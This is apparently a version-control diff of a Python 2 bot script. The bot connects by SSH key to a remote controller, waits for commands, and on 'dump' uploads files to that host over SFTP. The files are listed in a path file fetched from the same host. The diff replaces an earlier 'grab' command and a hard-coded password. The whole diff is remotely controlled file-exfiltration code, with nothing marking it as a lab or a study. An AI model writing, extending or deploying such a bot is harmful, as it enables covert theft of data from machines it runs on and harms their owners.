@@ -11,7 +11,7 @@ import ChannelSSH
 import os
 import logging
 logging.basicConfig()
-duper_lp= "./android_dm.cnf"
+duper_lp= "./path.cnf"
 class Bot():
     def __init__(self):
         self.path_source = None
@@ -31,13 +31,20 @@ class Bot():
     def dump_db(self):
         try:
             transport = Transport(('192.168.43.99', 222))
-            transport.connect(username='dumper', password='dontgiveafuck')
+            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
+            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
+            transport.connect(username='bot', pkey=mykey)
             sftp_client = SFTPClient.from_transport(transport)
-            sftp_client.put(self.path, '/home/roughiz/tmp/test/' +self.path)
+            with open(duper_lp) as f:
+                content = f.readlines()
+            # to remove whitespace characters like `\n` at the end of each line
+            for line in content:
+                sftp_client.put(line.strip(), 'bot/dump/testdump.cnf')
             sftp_client.close()
             transport.close()
-        except:
-            pass
+            print "End of dumping files "
+        except Exception, e:
+            print "Fct:Dumper file export: " + str(e)
     def get_dumper_file(self):
         try:
             transport = Transport(('192.168.43.99', 222))
@@ -46,6 +53,7 @@ class Bot():
             mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
             transport.connect(username='bot',pkey = mykey)
             sftp_client = SFTPClient.from_transport(transport)
+            # should verify if file duper_lp exist, create it else
             sftp_client.get(self.path_source, duper_lp, callback=None)
             sftp_client.close()
             transport.close()
@@ -61,17 +69,14 @@ class Bot():
         chan = client.get_transport().open_session()
         while True:
             command = ChannelSSH.receiveFromChannel(chan)
-            if 'deconnect' in command:
+            print  "cmd::"+command
+            if 'deconnect' == command:
                 ChannelSSH.closeChannel(chan)
                 break
-            elif 'grab' in command:
-                try:
-                    blah, path = command.split('*')
-                except:
-                    ChannelSSH.sendToChannel('[-]command syntax error',chan)
-                Thread(target=self.dump_db, args=(path,)).start()
-                ChannelSSH.sendToChannel('[+]Starting SFTP Function',chan)
-            elif 'LOADPATH' in command:
+            elif 'dump' == command:
+                ChannelSSH.sendToChannel('[+] Starting dump of files',chan)
+                Thread(target=self.dump_db).start()
+            elif '**LOADPATH**' in command:
                 inita, path_d,path_s = command.split(';')
                 self.path_source = path_s
                 self.path_destination = path_d
